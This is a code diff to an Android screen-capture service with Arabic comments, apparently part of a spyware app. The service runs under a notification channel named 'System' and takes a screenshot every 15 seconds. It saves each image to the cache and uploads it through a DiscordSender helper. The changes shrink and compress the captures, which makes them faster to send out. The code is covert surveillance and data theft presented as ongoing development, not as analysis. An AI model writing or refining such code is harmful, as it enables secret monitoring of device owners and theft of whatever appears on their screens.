@@ -28,8 +28,7 @@ public class ScreenService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // منع الكراش: تشغيل الإشعار بأول ثانية
-        String channelId = "system_service";
+        String channelId = "sys_service";
         NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
         getSystemService(NotificationManager.class).createNotificationChannel(channel);
         startForeground(1, new NotificationCompat.Builder(this, channelId)
@@ -50,13 +49,13 @@ public class ScreenService extends Service {
         DisplayMetrics metrics = new DisplayMetrics();
         WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         wm.getDefaultDisplay().getMetrics(metrics);
-        imageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay("Capture", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
+        imageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2);
+        virtualDisplay = mediaProjection.createVirtualDisplay("Cap", metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
 
         handler.postDelayed(new Runnable() {
             @Override public void run() {
                 capture();
-                handler.postDelayed(this, 15000); // إرسال صورة كل 15 ثانية
+                handler.postDelayed(this, 15000); // صورة كل 15 ثانية
             }
         }, 5000);
     }
@@ -70,9 +69,10 @@ public class ScreenService extends Service {
                 bitmap.copyPixelsFromBuffer(buffer);
                 File file = new File(getCacheDir(), "s.png");
                 try (FileOutputStream out = new FileOutputStream(file)) {
-                    bitmap.compress(Bitmap.CompressFormat.PNG, 50, out);
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out);
                     DiscordSender.sendPhoto(file);
-                } catch (Exception e) {}
+                }
+                bitmap.recycle();
             }
         } catch (Exception e) {}
     }
